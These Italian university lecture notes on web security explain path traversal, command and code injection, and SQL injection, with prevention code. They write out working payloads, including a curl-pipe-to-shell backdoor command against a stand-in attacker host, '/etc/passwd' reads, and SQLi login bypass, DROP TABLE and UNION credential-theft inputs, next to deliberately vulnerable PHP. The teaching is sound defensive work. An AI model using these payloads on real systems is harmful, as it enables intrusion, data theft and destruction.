[[3 - CS - Application Level - Web Technologies|previous lesson]]
Sintesi [[4 - CS Applitcation Level - Sintesi Web Security Part I]]
# Sicurezza Web: Parte I

Docente: Leonardo Querzoni (Sapienza Università di Roma)

Licenza: Creative Commons BY-NC-SA 2.0

_(Crediti: Slide progettate da Emilio Coppa, basate su materiale di Marco Squarcina, Mauro Tempesta e Fabrizio D'Amore.)_

---

## Il Costo delle Vulnerabilità

### Definizioni

Una vulnerabilità è una debolezza che permette a un attaccante di ridurre la sicurezza delle informazioni di un sistema (confidenzialità, integrità, disponibilità).

Una vulnerabilità nasce dall'intersezione di tre elementi:

- **Suscettibilità o difetto del sistema:** Un bug, un errore di progettazione o una configurazione errata.
    
- **Accesso dell'attaccante al difetto:** L'attaccante deve poter raggiungere il componente vulnerabile.
    
- **Capacità dell'attaccante di sfruttare il difetto:** L'attaccante deve avere gli strumenti o le conoscenze per trasformare il difetto in un vantaggio.
    

### Cause e Fattori Favorenti

**Cause Principali:**

- **Bug:** Errori nel codice (es. buffer overflow, race condition). Se abbiamo una definizione di una funzionalità da implementare, la presenza di un bug mostra che l'implementazione non è un 1 a 1 con la definizione. Nota che un Bug porta ad un comportamento non definito in un programma, ma non necessariamente può essere una vulnerabilità. Noi vogliamo proteggerci dalle minacce (Threats) che sfruttano le vulnerabilità (generate ad esempio da un bug).
    
- **Difetti di progettazione:** Errori nell'architettura del sistema (es. mancanza di crittografia dove necessaria).
    
- **Configurazioni errate (Misconfigurations):** Impostazioni di default non sicure, permessi troppo permissivi. Ci sono software che sono estremamente difficili da configurare, che addirittura ti impongono determinate configurazioni e tu non puoi toccare nulla oppure poco.
    
- **Invecchiamento (Aging):** Software non aggiornato che diventa vulnerabile a nuovi attacchi. Come gli umani, nel tempo il codice vecchio potrebbe portare a delle incompatibilità ad altri software aggiornati. Anche se il software può essere sistemato, a volte per questioni di compatibilità (legacy software) devono vivere con queste vulnerabilità. 
    

**Fattori Favorenti:**

- **Complessità del sistema:** Più un sistema è complesso, più è difficile renderlo sicuro.
    
- **Connettività:** L'essere sempre connessi aumenta la superficie d'attacco.
    
- **Incompetenza:** Mancanza di formazione o consapevolezza sulla sicurezza da parte di sviluppatori o amministratori.
    

### Motivazioni
[Grafico che mostra l'aumento delle vulnerabilità nel tempo (1988-2012)]
![[Pasted image 20251110151754.png]]
La vulnerabilità nel software è una delle ragioni principali dell'insicurezza.

- Si stimano circa **20 difetti ogni mille righe di codice** (Dacey 2003).
    
- C'è un aumento costante nello sfruttamento delle vulnerabilità.
    
- Un software completamente sicuro è improbabile.
    
- Tuttavia, il **95% delle violazioni potrebbe essere prevenuto** mantenendo i sistemi aggiornati con le patch.
    


---

## Ciclo di Vita di una Vulnerabilità
[Immagine del ciclo di vita della vulnerabilità: Creazione -> Scoperta -> Sfruttamento -> Divulgazione -> Patch disponibile -> Patch applicata -> EoL Software]
![[Pasted image 20251110152948.png]]

Il ciclo di vita di una vulnerabilità descrive le sue fasi, dalla creazione alla risoluzione.

1. **Creazione:** Il difetto viene introdotto durante lo sviluppo.
    
2. **Scoperta (Discovery):** Il difetto viene trovato da utenti malevoli (black hat) o benigni (white hat, ricercatori).
    
3. **Sfruttamento (Exploitation):** Gli attaccanti iniziano a usare la vulnerabilità. Può essere sfruttata anche per anni senza renderla nota.
    
4. **Divulgazione (Disclosure):** La vulnerabilità viene resa nota. Può essere tenuta segreta (per sfruttarla), divulgata pubblicamente (full disclosure) o venduta.
    
5. **Patch:** Il fornitore rilascia una correzione. 
    
6. **Applicazione della Patch:** Gli utenti installano la correzione.
    

**Chi paga il costo?**
![[Pasted image 20251110153044.png]]

- **Prima della scoperta:** Nessun costo.
    
- **Dopo la scoperta (mercato nero):** Costo per chi compra l'exploit.
    
- **Dopo la divulgazione:** Costo per il fornitore (sviluppo patch) e per l'utente (danni subiti prima della patch).
    
Vogliamo almeno portare a zero il costo dell'utente, anche a costo di aumentare il costo del fornitore. Da notare che se qualcuno rende pubblica la vulnerabilità ed io non l'ho ancora patchato, allora perdo reputazione ed eventualmente anche futuri acquirenti. 

### Responsible Disclosure (Divulgazione Responsabile)

Qual è il processo corretto per divulgare una vulnerabilità? Non c'è un consenso universale.

- Diversi fornitori hanno linee guida diverse.
    
- Il CERT concede spesso un periodo di grazia di 45 giorni prima della divulgazione pubblica.
    
- Le aziende di sicurezza seguono le proprie policy interne.

Alcune persone istintivamente rendono subito noto le falle di sicurezza, perché "le persone devono sapere" ma in questo modo tale divulgazione può essere causa di ulteriori danni agli stessi utenti.

Il fornitore a volte può pagare davvero tanto per risolvere una vulnerabilità (immagina una vulnerabilità nel kernel di linux, e bisogna fare 1000 test in ogni situazione possibile).

**Effetti delle Politiche di Divulgazione:**

- **Full Vendor Disclosure (Solo al fornitore):** Promuove la segretezza, dà il controllo totale al fornitore, ma potrebbe non incentivare una correzione rapida.
    
- **Immediate Public Disclosure (Divulgazione pubblica immediata):** Promuove la trasparenza, incentiva fortemente il fornitore a correggere, permette agli utenti di prendere contromisure, ma espone immediatamente tutti ai rischi.
    
- **Hybrid Disclosure (Ibrida - Responsible):** Cerca un equilibrio, dando tempo al fornitore prima di rendere pubblica la vulnerabilità.
    

### Google VRP, 2018
google pays also the ones that finds vulnerability
![[Pasted image 20251110154545.png]]
alcune persone fanno solo bug bounty programs come mestiere
### HACKER ONE Top 10, 2018
![[Pasted image 20251110154711.png]]![[Pasted image 20251110154919.png]]
The information in the OWASP website tells in a didactic way how those vulnerability works without teaching how to do it.

### Zerodium
queste compagnie vendono queste compagnie a governi per creare software di sorvegli-azione. Questi software sono legali in molti paesi (inclusi l'Italia) ma in genere devi garantire che siano usati correttamente (questo spesso non avviene): controllare la criminalità oppure la libertà di parola di un giornalista?
Queste compagnie pagano di più dei bugs bounty (meno del black market) ma a prescindere non garantiscono sicurezza delle informazioni che lasciano e non garantiscono il corretto utilizzo.
![[Pasted image 20251110155216.png]]![[Pasted image 20251110155226.png]]

### ProxyLogon
![[Pasted image 20251110155903.png]]

---

## Rischi di Sicurezza Web (the cursed Web)
![[Pasted image 20251110155826.png]]

Il Web è un ecosistema "maledetto" per la sicurezza a causa di:

- **Semplicità illusoria:** Creare app web sembra facile, portando a una mancanza di consapevolezza sulla sicurezza.
    
- **Limiti di tempo e risorse:** Lo sviluppo rapido spesso sacrifica la sicurezza.
    
- **Complessità crescente:** Le moderne app web sono estremamente complesse.
    
- **Spostamento del perimetro:** Il focus della sicurezza si è spostato dalla rete al livello applicativo. Le app web sono intenzionalmente esposte a Internet ma collegate a dati interni sensibili.
![[Pasted image 20251110160222.png]]![[Pasted image 20251110160232.png]]

### Problemi Fondamentali dell'Ecosistema Web
![[Pasted image 20251110160317.png]]

- **Problemi dei protocolli di rete:** MITM, SSL Strip, siti con contenuto misto (HTTP/HTTPS), cookie trapelati su HTTP.
    
- **Mescolanza di codice e dati:** È la causa radice di molte vulnerabilità come SQL Injection e XSS, dove l'input dell'utente viene interpretato erroneamente come codice.
    
- **Superficie d'attacco illimitata:** CSRF, Clickjacking, XSSI, XS-Search.
    
- **Design legacy:** API vecchie e non sicure, funzionalità web pericolose mantenute per retrocompatibilità, design dei cookie con scarsi confini di sicurezza.
    

### Contromisure (Difesa in Profondità)
![[Pasted image 20251110160332.png]]![[Pasted image 20251110160343.png]]![[Pasted image 20251110160401.png]]

Le contromisure si applicano a diversi livelli:

- **Client:** Filtri XSS (ormai spesso rimossi dai browser moderni perché potevano introdurre nuove vulnerabilità), Sandbox, Isolamento dei siti. Questi sono Defense-in-depth Mechanism
    
- **Ibrido (Client/Server):** HSTS (forza HTTPS), CSP (Content Security Policy), CORS (Cross-Origin Resource Sharing), Fetch Metadata, Trusted Types, policy dei cookie (es. `SameSite`, `HttpOnly`, `Secure`). Questi sono Policy-Based Mechanism
    
- **Server:** Prepared statements (contro SQLi), filtri lato server, Web Application Firewall (WAF), token CSRF. 
    

---

## Top 10 Rischi di Sicurezza Web (OWASP)
![[Pasted image 20251110160423.png]]

**OWASP (Open Web Application Security Project)** pubblica periodicamente la Top 10 dei rischi più critici per le applicazioni web.

[Confronto tra OWASP Top 10 2013, 2017 e 2021]

**OWASP Top 10 2021:**

1. **A01: Broken Access Control:** Violazioni nelle restrizioni su ciò che gli utenti autenticati possono fare.
    
2. **A02: Cryptographic Failures:** Protezione inadeguata dei dati sensibili (es. password in chiaro, crittografia debole). Era "Sensitive Data Exposure".
    
3. **A03: Injection:** Include SQL, NoSQL, OS command injection, e ora anche Cross-Site Scripting (XSS). Questa classe esiste dagli albori di internet e si pensa che non possano essere fermati in alcun modo.
    
4. **A04: Insecure Design:** Nuova categoria che si concentra sui rischi legati a difetti di progettazione e architettura.
    
5. **A05: Security Misconfiguration:** Include anche XML External Entities (XXE).
    
6. **A06: Vulnerable and Outdated Components:** Uso di librerie o framework con vulnerabilità note.
    
7. **A07: Identification and Authentication Failures:** Problemi con login, sessioni, ecc. Era "Broken Authentication".
    
8. **A08: Software and Data Integrity Failures:** Nuova categoria che riguarda aggiornamenti software, dati critici e pipeline CI/CD non sicuri. Include la deserializzazione insicura.
    
9. **A09: Security Logging and Monitoring Failures:** Mancanza di log adeguati per rilevare e rispondere agli attacchi.
    
10. **A10: Server-Side Request Forgery (SSRF):** Nuova categoria, dove un attaccante può indurre il server a fare richieste HTTP arbitrarie.
    

### Prevalenza nel Mondo Reale (Dati HackerOne)

I dati dei programmi di bug bounty (come HackerOne e Google VRP) mostrano che le vulnerabilità più comuni e pagate non sempre coincidono esattamente con la Top 10 teorica di OWASP, ma **XSS** rimane spesso la più diffusa, seguita da problemi di controllo degli accessi e autenticazione.

- **Google VRP (2018):** XSS rappresentava il 35.6% delle vulnerabilità web pagate.
    
- **HackerOne (2018):** XSS era la vulnerabilità più segnalata, seguita da Improper Authentication e Information Disclosure.
    

---

## Attaccanti e Programmi di Bug Bounty

### Tipi di Attaccanti

- **Attaccante di Rete:** Passivo (ascolta, es. su Wi-Fi pubblico) o Attivo (modifica il traffico, MITM, DNS poisoning).
    
- **Attaccante Malware:** Esegue codice direttamente sulla macchina della vittima.
    
- **Attaccante Web:** Controlla un sito malevolo (`attacker.com`) e cerca di attaccare gli utenti che lo visitano, o sfrutta vulnerabilità in siti legittimi (es. tramite XSS o CSRF).
    

### Esempio: ProxyLogon (2021)

Una grave vulnerabilità in Microsoft Exchange Server che permetteva a un attaccante non autenticato di eseguire comandi arbitrari sul server (RCE) semplicemente avendo accesso alla porta 443 (HTTPS).

### Mercato delle Vulnerabilità (Zerodium)

Aziende come Zerodium acquistano exploit zero-day (vulnerabilità non ancora note al fornitore) per rivenderli (spesso a governi o agenzie). I prezzi possono essere molto alti:

- Fino a **$1.000.000** per un exploit Windows RCE "Zero Click" (che non richiede interazione dell'utente).
    
- Fino a **$500.000** per exploit su Chrome o Apache.
    
- Fino a **$250.000** per exploit su MS Exchange o Outlook.
    

Questi prezzi riflettono la difficoltà di trovare e sfruttare queste vulnerabilità e il loro valore strategico.

---

# Minacce e Difese Web: Parte 1

## Path Traversal
![[Pasted image 20251117143625.png]]
### Path Traversal in sintesi

Il **Path Traversal** (noto anche come Directory Traversal o Dot-Dot-Slash attack) è una vulnerabilità che consente a un attaccante di accedere a file e directory memorizzati al di fuori della cartella radice del web (webroot).

Normalmente, un'applicazione dovrebbe limitare l'accesso solo ai file autorizzati. Tuttavia, se l'input dell'utente non è adeguatamente sanitizzato, un attaccante può utilizzare sequenze di caratteri speciali per "risalire" l'albero delle directory.

- **Uso previsto:** `loadimage?filename=gift.png` (carica un'immagine legittima).
    
- **Attacco:** `/loadimage?filename=../../../etc/passwd` (tenta di accedere a file di sistema sensibili).
    

_Nota: L'immagine sopra mostra come l'uso di `../` permetta di uscire dalla cartella prevista e leggere `/etc/passwd`, un file comune nei sistemi Unix/Linux che contiene l'elenco degli utenti._

**Riferimento OWASP:** A01:2021 - Broken Access Control > Path Traversal

### Esempio di Attacco Path Traversal

Consideriamo un server web con la seguente configurazione:

- **Webroot:** `/var/www/html` (la directory principale pubblica del sito).
    
- I file al di fuori di questa directory non dovrebbero essere accessibili via web.
    
- La webroot contiene uno script `show.php` e una directory `pages` con file di testo.
    

Codice vulnerabile (`show.php`):

```php
<?php
    // Vulnerabilità: l'input $_GET["page"] viene concatenato direttamente
    echo file_get_contents("pages/" . $_GET["page"]);
?>
```

_Arricchimento: La funzione `file_get_contents` in PHP legge il contenuto di un file in una stringa. Se l'attaccante controlla il percorso del file, può leggere qualsiasi file che il processo del server web ha i permessi di leggere._

#### Uso Previsto

Una richiesta legittima per visualizzare un file di testo nella directory consentita:

GET /show.php?page=team.txt HTTP/2

Risultato: Il server restituisce il contenuto di /var/www/html/pages/team.txt.
![[Pasted image 20251117143825.png]]

#### L'Attacco

Causa principale: L'input fornito dall'utente tramite la variabile page non è filtrato (o è filtrato male).

L'attaccante può usare ../ (su Linux/Unix) o ..\ (su Windows) per risalire nella gerarchia delle directory.

GET /show.php?page=../../../etc/passwd HTTP/2

Risultato: Il server risolve il percorso in /var/www/html/pages/../../../etc/passwd, che equivale a /etc/passwd, e ne restituisce il contenuto (es. root:x:0:0:root:/root:/bin/bash...).

![[Pasted image 20251117143839.png]]

---

### Prevenzione del Path Traversal

**Ideale: Non utilizzare mai l'input dell'utente direttamente per costruire percorsi di file.**

Nel mondo reale: Se necessario, validare rigorosamente tutto l'input utente.

1. **Allow-list (Lista consentita):** Se possibile, permettere solo una lista statica di nomi di file.
    
2. **Validazione del percorso canonico:** Calcolare il percorso assoluto (canonico) del file richiesto e assicurarsi che inizi con la directory base prevista.
    

Esempio di correzione in PHP:

```php
<?php
$pdir = "/var/www/html/pages/";
// realpath risolve i '../', i link simbolici e restituisce il percorso assoluto
$file = realpath($pdir . $_GET["file"]);

// Verifica che il file esista E che il percorso inizi con la directory prevista
if ($file !== false && strncmp($file, $pdir, strlen($pdir)) === 0) {
    echo file_get_contents($file);
} else {
    // Gestione errore: tentativo di accesso non autorizzato
    echo "Error: invalid input";
}
?>
```

_Arricchimento: `realpath()` è fondamentale perché normalizza il percorso, rimuovendo le sequenze `../`. `strncmp` assicura che il percorso risolto si trovi ancora all'interno della "gabbia" autorizzata (`$pdir`)._

#### Difesa in Profondità (Defense in Depth)

Non affidarsi a un solo meccanismo di difesa. Aggiungere strati di sicurezza:

- **Privilegi minimi:** Il processo del web server dovrebbe avere accesso solo alle directory strettamente necessarie. Questo perché il browser non ha alcun motivo di accedere in altre directory.
    
- **Sandboxing:** Utilizzare ambienti isolati come **chroot jail** (che cambia la directory root apparente per il processo), **SELinux** (che applica politiche di controllo accessi obbligatorie) o **container** (Docker) per limitare i danni in caso di compromissione dell'applicazione.
    

### Configurazioni e Directory Importanti

- **Document Root:** La cartella designata nel server Web per contenere le pagine pubbliche (es. `htdocs`, `public_html`, `/var/www/html`).
    
- **Server Root:** Contiene i file di configurazione, i log e gli eseguibili del server stesso. Non dovrebbe mai essere accessibile dal web.
    

#### Permessi dei file

Bisogna prestare attenzione ai permessi:

- È buona norma definire un utente e un gruppo specifici per il web server (es. `www-data` o `nobody`).
    
- Gli autori dell'HTML dovrebbero essere aggiunti al gruppo web, ma il server stesso dovrebbe avere solo i permessi di lettura necessari sui file pubblici.
    

#### Altre configurazioni rischiose

- **Automatic Directory Listing:** Se abilitato, permette a un attaccante di vedere l'elenco dei file in una directory se manca un file index (es. `index.html`). Può rivelare file sensibili dimenticati (backup, log, file temporanei).
    
- **Symbolic link following:** Se il server segue i link simbolici, un attaccante potrebbe crearne uno che punta a file sensibili fuori dalla webroot.
    
- **Server Side Include (SSI):** Vecchia tecnologia (`.shtml`) che permetteva di includere file o eseguire comandi. Se abilitata e l'input utente vi finisce dentro, porta a RCE.
    
- **User maintained directories:** Funzionalità come `example.com/~user` possono esporre file personali degli utenti se non configurate correttamente.
    

---

### Training Challenge #02 (Esempio Pratico)

- **Obiettivo:** Trovare il flag nel file `/flag`.
    
- **Analisi del codice vulnerabile:**
    
    PHP
    
    ```
    $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
    // ...
    // Tentativo di sanitizzazione debole:
    $lang = str_replace('../', '', $lang);
    $c = file_get_contents("flags/$lang");
    ```
    
- **Problema:** L'header `HTTP_ACCEPT_LANGUAGE` è controllato dal client. La sanitizzazione con `str_replace` non è ricorsiva.
    
    - _Bypass:_ Se l'attaccante invia `....//`, la funzione rimuove `../` centrale e lascia `../`. Questo è un classico esempio di filtro bypassabile.
        
- **Vettori di attacco:** Modificare l'header `Accept-Language` della richiesta HTTP per iniettare sequenze di path traversal.
    

---

## Command & Code Injection
![[Pasted image 20251117145401.png]]

### Command Injection in sintesi

La **Command Injection** si verifica quando un'applicazione passa dati non sicuri (forniti dall'utente) a una shell di sistema. Un attaccante può usare questo difetto per eseguire comandi arbitrari del sistema operativo con i privilegi del server web.

- **Impatto:** Spesso porta alla compromissione totale del sistema (Full System Control), accesso ai dati sensibili, movimento laterale nella rete locale.
    
- **Esempio classico:** `$(curl https://web-attacker.com/backdoor.sh | sh)` (scarica ed esegue una backdoor).
    

### Attacchi di Command Injection

Molti linguaggi offrono funzioni per eseguire comandi di sistema (es. system(), exec(), passthru(), shell_exec() in PHP, o os.system() in Python).

Queste funzioni avviano una shell (come /bin/sh o cmd.exe) per elaborare il comando.

**Esempio vulnerabile (`ping.php`):**

```php
<?php
// Vulnerabilità: concatenazione diretta dell'input utente in un comando shell
system("ping -c 4 " . $_GET["ip"] . " -i 1");
?>
```

#### Uso Previsto

Richiesta: GET /ping.php?ip=8.8.8.8

Comando eseguito: ping -c 4 8.8.8.8 -i 1

Risultato: Output standard del comando ping.
![[Pasted image 20251117145644.png]]

#### L'Attacco

Un attaccante può usare **separatori di comandi** della shell per iniettare comandi aggiuntivi.

- Separatori comuni: `;` (esegue in sequenza), `&&` (esegue se il precedente ha successo), `||` (esegue se il precedente fallisce), `|` (pipe), `$` o `` ` `` (sostituzione di comando), e il carattere newline `\n` (`%0a` in URL encoding).
    

Richiesta: `GET /ping.php?ip=8.8.8.8;cat+/etc/passwd+#`

- `;`: Termina il comando `ping`.
    
- `cat /etc/passwd`: Nuovo comando iniettato.
    
- #: Commenta il resto del comando originale ( -i 1) per evitare errori di sintassi.
    
    Comando eseguito: ping -c 4 8.8.8.8; cat /etc/passwd # -i 1
![[Pasted image 20251117145701.png]]
Command Injection può essere anche fixato (anche qui) inserendo dei permessi in base al gruppo di appartenenza. Come

---

### Code Injection

La **Code Injection** è simile, ma invece di eseguire comandi del sistema operativo, l'attaccante inietta codice che viene interpretato ed eseguito dall'applicazione stessa (es. codice PHP, Python, JavaScript).

**Esempio vulnerabile (`calc.php`):**
```PHP
<?php
// Vulnerabilità: eval() esegue la stringa come codice PHP
eval("echo " . $_GET["expr"] . ";");
?>
```

_Arricchimento: Funzioni come `eval()` sono estremamente pericolose perché permettono di fare qualsiasi cosa il linguaggio supporti.
![[Pasted image 20251117150531.png]]_

#### L'Attacco

Richiesta: GET /calc.php?expr=file_get_contents('/etc/passwd')

Il server esegue: eval("echo file_get_contents('/etc/passwd');");

Risultato: Il contenuto del file viene visualizzato. L'attaccante ha ottenuto l'esecuzione di codice arbitrario (RCE - Remote Code Execution).

![[Pasted image 20251117150554.png]]

### Moodle Command line Injection (2018)
![[Pasted image 20251117151028.png]]
Details: https://blog.ripstech.com/2018/moodle-remote-code-execution/
guarda [[Moodle Command Line Injection Example|qui]]
Ci sono volute 4 patch per sistemare questa vulnerabilità. Non è assolutamente facile gestire user-inputs.

---

### Prevenzione

1. **EVITARE** funzioni pericolose come `eval()` che eseguono codice dinamico.
    
2. **EVITARE**, se possibile, funzioni che eseguono comandi di sistema. Usare librerie native del linguaggio equivalenti (es. usare una libreria per il ping invece di chiamare il binario del sistema operativo).
    
3. **Se indispensabile**, usare funzioni specifiche per l'escaping degli argomenti (es. `escapeshellarg()` in PHP), anche se questa è una soluzione spesso fragile.
    
4. **Difesa in profondità:** Usare sandbox, container e privilegi minimi per limitare l'impatto se l'injection dovesse riuscire.
    

---

### Training Challenge #03 (Esempio Pratico)

- **Scenario:** Un'interfaccia di debug "Smart Cat" che permette di fare solo un ping.
    
- **Analisi:** L'applicazione esegue `ping` ma sembra avere dei filtri (es. blocca `&&`).
    
- **Soluzione (dalle slide Burp):** L'attaccante scopre che il carattere newline (`%0a`) non è filtrato e può essere usato come separatore di comandi.
    
    - Payload: `google.it%0afind` (esegue ping di google.it, poi esegue il comando `find` per cercare file, probabilmente la flag).
        
    - Questo dimostra quanto sia difficile implementare una sanitizzazione perfetta (blacklist) invece di usare un approccio sicuro per design.

# SQL Injection

## Cos'è SQL?

**SQL (Structured Query Language)** è il linguaggio dichiarativo standard utilizzato per interrogare e gestire i database relazionali (RDBMS). I database relazionali si basano sul concetto di **tabelle** (composte da righe e colonne) dove vengono memorizzati i dati strutturati degli utenti.

_Arricchimento:_ A differenza dei database NoSQL (come MongoDB), i database relazionali (come MySQL, PostgreSQL, Oracle, SQL Server) richiedono uno schema predefinito e garantiscono le proprietà ACID (Atomicità, Coerenza, Isolamento, Durabilità) per le transazioni.

Esempio di tabella `users`:

|**user**|**password**|**age**|
|---|---|---|
|admin|1f4sdge!|37|
|mauro|mkfln34.|30|
|matteo|a4njDa!|42|

> **Nota di sicurezza:** Nei siti web reali, le password NON dovrebbero mai essere memorizzate in chiaro come nell'esempio sopra, ma sempre sotto forma di hash (es. utilizzando bcrypt o Argon2) con un salt univoco.

### Sintassi SQL di Base

Ecco le operazioni fondamentali (CRUD - Create, Read, Update, Delete):

- **Recuperare record (SELECT):**
    
    ```SQL
    SELECT * FROM users WHERE user='admin' AND password='1f4sdge!';
    ```
    
- **Aggiungere nuovi record (INSERT):**
    
    ```SQL
    INSERT INTO users VALUES ('karl', 's3cr3t', 23);
    ```
    
- **Aggiornare record esistenti (UPDATE):**
    
    ```SQL
    UPDATE users SET age=age+1;
    ```
    
- **Rimuovere record (DELETE):**
    
    ```SQL
    DELETE FROM users WHERE age < 25;
    ```
    
- **Rimuovere una tabella (DROP):**
    
    ```SQL
    DROP TABLE users;
    ```
    

---

## SQL Injection (SQLi) in Sintesi
![[Pasted image 20251117152059.png]]

La **SQL Injection (SQLi)** è una vulnerabilità di validazione dell'input che si verifica quando dati non fidati forniti dall'utente vengono concatenati direttamente all'interno di una query SQL inviata al database. È un'istanza specifica delle vulnerabilità di **Code Injection**, ma nel contesto dei database.

L'interprete SQL non riesce a distinguere tra il codice legittimo della query e i dati forniti dall'utente, eseguendo quindi comandi non previsti dallo sviluppatore.

Impatto:

Fornendo un payload creato ad hoc, un attaccante può alterare la logica della query e:

- Ottenere accesso non autorizzato a dati sensibili (Confidenzialità).
    
- Alterare l'integrità dei dati nel database (Integrità).
    
- Eseguire attacchi distruttivi (es. eliminare tabelle) (Disponibilità).
    

![[Pasted image 20260128230600.png]]
_La celebre vignetta di XKCD che illustra un attacco distruttivo SQLi dove il nome dello studente viene sanitizzato male, portando alla cancellazione dei record scolastici._

### Esempio Base: Bypass dell'Autenticazione

Consideriamo un codice PHP vulnerabile per il login:
```php
<?php
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
// VULNERABILE: Concatenazione diretta dell'input utente
$query = "SELECT * FROM users WHERE user = '" . $_POST["user"] . "' AND password = '" . $_POST["password"] . "'";
$sth = $db->query($query);
$user = $sth->fetch();

if ($user !== false) {
    // login effettuato, avvia sessione
    start_session();
    $_SESSION["user"] = $user["user"];
} else {
    // login fallito
}
?>
```
Sono le peggiori 10 line di codice mostrate dal prof: ha un botto di vulnerabilità

#### Caso d'uso legittimo

- User: `admin`
    
- Password: `1f4sdge!`
    
- Query risultante:
    ```SQL
    SELECT * FROM users WHERE user='admin' AND password='1f4sdge!'
    ```
    

#### Exploit: Login senza password (SQLi Tautologica)

L'attaccante usa l'input:

- User: `admin' --`
    
- Password: `qualsiasi`
    

La query diventa:
```SQL
SELECT * FROM users WHERE user='admin' -- ' AND password='qualsiasi'
```

_Arricchimento:_ Il simbolo `--` (spesso seguito da uno spazio) indica l'inizio di un commento in SQL. Tutto ciò che segue viene ignorato dal database. In questo modo, la parte `AND password='...'` viene disattivata, e la query ritorna l'utente 'admin' senza controllarne la password.

#### Exploit Alternativo (`OR` condition)

- User: `admin`
    
- Password: `' OR password LIKE '%`
    

Query risultante:
```SQL
SELECT * FROM users WHERE user='admin' AND password='' OR password LIKE '%';
```

La condizione `LIKE '%'` è sempre vera (matcha qualsiasi sequenza di caratteri). Poiché c'è un `OR`, l'intera clausola `WHERE` diventa vera, autenticando spesso l'attaccante come il primo utente nella tabella (solitamente l'amministratore).

---

## Tecniche Avanzate di SQL Injection

## Stacking Queries (Query Impilate)

Le **Query Impilate** si riferiscono alla possibilità di eseguire istruzioni SQL multiple e distinte in un'unica chiamata al database, tipicamente separandole con un punto e virgola (`;`).

Se la configurazione del server di database abilita questa funzione (spesso è disabilitata di default nei driver moderni rivolti al web), apre la porta a gravi attacchi che possono compromettere l'integrità e la disponibilità del database.

L'attacco funziona "evadendo" dalla query prevista e "impilando" una nuova query dannosa subito dopo.

### Esempio 1: Aggiungere un Nuovo Utente

Un attaccante può iniettare un nuovo utente nella tabella `users`.

- **Input dell'Attaccante:** `'; INSERT INTO users (user, password, age) VALUES ('attacker', 'mypwd', 1) -- -`
    
- **SQL Risultante Inviato al DB:**
    ```SQL
    SELECT * FROM users WHERE user=''; 
    INSERT INTO users (user, password, age) VALUES ('attacker', 'mypwd', 1);
    -- -' AND password='whatever'
    ```
    
- **Come Funziona:**
    
    1. La prima query (`SELECT...`) fallisce in modo innocuo.
        
    2. Il database esegue quindi la _seconda_ query, un'istruzione `INSERT` dannosa, creando un nuovo utente.
        
    3. Il `-- -` (uno spazio è cruciale dopo i due trattini) è un commento SQL, che neutralizza il resto della stringa di query originale (`' AND password='whatever'`), prevenendo errori di sintassi.
        

### Esempio 2: Modificare Dati (Cambiare Password Admin)

Un attaccante può prendere il controllo di un account admin modificandone la password.

- **Input dell'Attaccante:** `'; UPDATE users SET password='newpwd' WHERE user='admin'-- -`
    
- **SQL Risultante Inviato al DB:**
    
    ```SQL
    SELECT * FROM users WHERE user=''; 
    UPDATE users SET password='newpwd' WHERE user='admin';
    -- -' AND password=""
    ```
    

### Esempio 3: Distruggere Dati (Eliminare una Tabella)

Questo è il tipo più distruttivo di attacco stacked query, in cui l'attaccante elimina un'intera tabella.

- **Input dell'Attaccante:** `'; DROP TABLE users -- -`
    
- **SQL Risultante Inviato al DB:**
    
    ```SQL
    SELECT * FROM users WHERE user=''; 
    DROP TABLE users;
    -- - AND password=";
    ```
    
    Questo comando elimina completamente la tabella `users`, portando a una catastrofica perdita di dati.
    

---

## Il "Piccolo Bobby Tables" (Monito)

Questa famosa vignetta di xkcd è l'illustrazione più nota di un attacco SQL injection di tipo stacked query.

![[Pasted image 20260128231443.png]]

[Immagine della vignetta xkcd "Little Bobby Tables"](https://xkcd.com/327/)

Nella vignetta, una madre chiama suo figlio `Robert'); DROP TABLE Students;--`, nome che, una volta inserito nel database scolastico non protetto, provoca la cancellazione di tutti i record degli studenti.

La battuta finale della vignetta, "Spero che abbiate imparato a sanificare i vostri input del database," è la lezione fondamentale. Nello sviluppo moderno, la best practice non è solo "sanificare" (che è difficile e soggetto a errori), ma usare **query parametrizzate** (prepared statements), che separano la _logica_ della query dai _dati_, rendendo impossibile questa intera classe di attacchi.

---

## Attacco UNION (Fuga di Dati da Altre Tabelle)

Questo è un tipo diverso di SQL Injection che non modifica o distrugge i dati, ma li _ruba_. Questo attacco usa l'operatore SQL `UNION` per "unire" i risultati della query legittima con i risultati di una nuova query `SELECT` dannosa.

### Esempio di Codice Vulnerabile

Questo codice PHP è vulnerabile perché costruisce una query concatenando l'input dell'utente (`$_GET["search"]`) direttamente nella stringa.

```PHP
<?php
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
start_session();

// VULNERABILE: $_GET["search"] è concatenato direttamente
$query = "SELECT sender, content FROM messages WHERE
          receiver = '".$_SESSION["user"]."' AND
          content LIKE '%".$_GET["search"]. "%'";

$sth = $db->query($query);
foreach ($sth as $row) {
    echo "Sender:".$row["sender"];
    echo "Content: ".$row["content"];
}
?>
```

### Il Payload dell'Attacco

Un attaccante può usare questo parametro `search` per rubare nomi utente e password dalla tabella `users`.

- **Input dell'Attaccante:** `' UNION SELECT user, password FROM users -- -`
    
- **SQL Risultante Inviato al DB:**
    
    ```SQL
    SELECT sender, content FROM messages WHERE 
    receiver='attacker' AND content LIKE '%' 
    UNION SELECT user, password FROM users 
    -- - %'
    ```
    

### Come Funziona e Requisiti

1. **`'` (Apostrofo):** Il primo apostrofo nel payload (`'`) chiude la stringa `content LIKE '%`.
    
2. **`UNION`:** L'operatore `UNION` aggiunge i risultati di una nuova query.
    
3. **Query Dannosa:** L'attaccante _indovina_ che esista una tabella chiamata `users` e che abbia colonne `user` e `password`.
    
4. **`-- -` (Commento):** Questo commenta il `%'` finale della query originale per evitare un errore di sintassi.
    

L'applicazione ora eseguirà questa query combinata. I risultati mostreranno prima eventuali messaggi legittimi, seguiti da un elenco completo di tutti i nomi utente e password dalla tabella `users`.

**Perché un attacco UNION funzioni, devono essere soddisfatte due condizioni:**

1. La query originale deve essere un'istruzione `SELECT`.
    
2. L'istruzione `SELECT` dannosa deve restituire lo **stesso numero di colonne** della query originale. (Qui, la query originale selezionava `sender, content` (2 colonne), quindi la query dell'attaccante `user, password` (2 colonne) corrisponde perfettamente).
    
3. I tipi di dati delle colonne devono essere compatibili tra le due query.
    

---

## Ricognizione del Database (Scoprire i Metadati)

Come fa un attaccante a sapere che la tabella si chiama `users` o che le colonne sono `user` e `password`? Può eseguire una ricognizione _interrogando i metadati stessi del database_.

